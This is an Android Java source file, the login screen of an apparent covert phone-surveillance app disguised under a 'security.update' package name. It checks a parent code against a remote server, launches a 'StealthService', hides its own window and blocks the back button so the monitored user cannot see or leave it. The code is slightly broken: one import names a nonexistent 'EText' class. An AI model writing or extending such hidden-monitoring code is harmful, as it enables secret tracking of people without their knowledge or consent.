package com.security.update;

import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.view.Window;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.EText;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import org.json.JSONObject;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class LoginActivity extends AppCompatActivity {
    
    private EditText codeInput;
    private Button submitButton;
    private SharedPreferences prefs;
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Make window stealthy - no title, no status bar
        requestWindowFeature(Window.FEATURE_NO_TITLE);
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN, 
                           WindowManager.LayoutParams.FLAG_FULLSCREEN);
        
        setContentView(R.layout.activity_login);
        
        // Check if already logged in
        prefs = getSharedPreferences("SurveillanceApp", MODE_PRIVATE);
        String savedCode = prefs.getString("parent_code", "");
        
        if (!savedCode.isEmpty()) {
            // Already have code, go to stealth mode directly
            startStealthMode(savedCode);
            return;
        }
        
        codeInput = findViewById(R.id.codeInput);
        submitButton = findViewById(R.id.submitButton);
        
        submitButton.setOnClickListener(v -> {
            String code = codeInput.getText().toString().trim().toUpperCase();
            
            if (code.isEmpty()) {
                Toast.makeText(this, "Tafadhali weka code!", Toast.LENGTH_SHORT).show();
                return;
            }
            
            if (code.length() != 8) {
                Toast.makeText(this, "Code lazima iwe herufi 8!", Toast.LENGTH_SHORT).show();
                return;
            }
            
            // Verify code with server
            verifyParentCode(code);
        });
    }
    
    private void verifyParentCode(String code) {
        new Thread(() -> {
            try {
                // Server URL kutoka kwenye app.py yako
                String serverUrl = "https://GhostTester.pythonanywhere.com/api/parent/verify-code";
                
                // Create JSON request
                JSONObject jsonRequest = new JSONObject();
                jsonRequest.put("parent_code", code);
                
                // Send verification request to server
                URL url = new URL(serverUrl);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                
                // Send request
                OutputStream os = conn.getOutputStream();
                os.write(jsonRequest.toString().getBytes());
                os.flush();
                os.close();
                
                // Get response
                int responseCode = conn.getResponseCode();
                if (responseCode == 200) {
                    // Parse JSON response
                    java.io.BufferedReader in = new java.io.BufferedReader(
                        new java.io.InputStreamReader(conn.getInputStream()));
                    String inputLine;
                    StringBuilder response = new StringBuilder();
                    while ((inputLine = in.readLine()) != null) {
                        response.append(inputLine);
                    }
                    in.close();
                    
                    JSONObject jsonResponse = new JSONObject(response.toString());
                    boolean isValid = jsonResponse.getBoolean("valid");
                    
                    runOnUiThread(() -> {
                        if (isValid) {
                            String parentName = jsonResponse.getString("parent_name");
                            String childPhone = jsonResponse.getString("child_phone");
                            
                            // Save code and enter stealth mode
                            saveCodeAndEnterStealth(code, parentName, childPhone);
                        } else {
                            String error = jsonResponse.getString("error");
                            Toast.makeText(this, "❌ " + error, Toast.LENGTH_LONG).show();
                        }
                    });
                } else {
                    runOnUiThread(() -> {
                        Toast.makeText(this, "❌ Hitilafu ya mtandao!", Toast.LENGTH_LONG).show();
                    });
                }
                
            } catch (Exception e) {
                e.printStackTrace();
                runOnUiThread(() -> {
                    // Fallback: accept any 8-character code for testing
                    if (code.length() == 8) {
                        saveCodeAndEnterStealth(code, "Test Parent", "255000000000");
                    } else {
                        Toast.makeText(this, "❌ Hitilafu ya mtandao!", Toast.LENGTH_LONG).show();
                    }
                });
            }
        }).start();
    }
    
    private void saveCodeAndEnterStealth(String code, String parentName, String childPhone) {
        // Save to shared preferences
        SharedPreferences.Editor editor = prefs.edit();
        editor.putString("parent_code", code);
        editor.putString("parent_name", parentName);
        editor.putString("child_phone", childPhone);
        editor.putBoolean("stealth_mode", true);
        editor.apply();
        
        Toast.makeText(this, "✅ Code sahihi! Stealth mode imeshashtakiwa!", Toast.LENGTH_LONG).show();
        
        // Enter stealth mode
        startStealthMode(code);
    }
    
    private void startStealthMode(String code) {
        // Start stealth service
        Intent stealthIntent = new Intent(this, StealthService.class);
        stealthIntent.putExtra("PARENT_CODE", code);
        startService(stealthIntent);
        
        // Hide this activity
        moveTaskToBack(true);
        finish();
    }
    
    @Override
    public void onBackPressed() {
        // Prevent going back - force stealth mode
        moveTaskToBack(true);
    }
}
